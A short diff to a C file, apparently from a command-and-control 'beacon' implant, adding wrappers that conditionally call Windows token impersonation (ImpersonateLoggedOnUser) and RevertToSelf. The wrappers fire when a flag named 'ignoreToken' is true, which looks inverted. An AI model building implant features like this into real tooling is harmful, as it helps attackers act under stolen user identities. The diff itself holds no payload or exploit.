@@ -1,5 +1,7 @@
 #include "pch.h"
 
+#include "identity.h"
+
 #include "beacon.h"
 
 
@@ -46,10 +48,22 @@ void IdentityRevertToken(void)
 		RevertToSelf();
 }
 
+void IdentityConditionalRevert(BOOL ignoreToken)
+{
+	if (ignoreToken)
+		IdentityRevertToken();
+}
+
 void IdentityImpersonateToken(void)
 {
 	if (gIdentityToken)
 		ImpersonateLoggedOnUser(gIdentityToken);
+}
+
+void IdentityConditionalImpersonate(BOOL ignoreToken)
+{
+	if (ignoreToken)
+		IdentityImpersonateToken();
 }
 
 void IdentityGetUidInternal(HANDLE hToken)
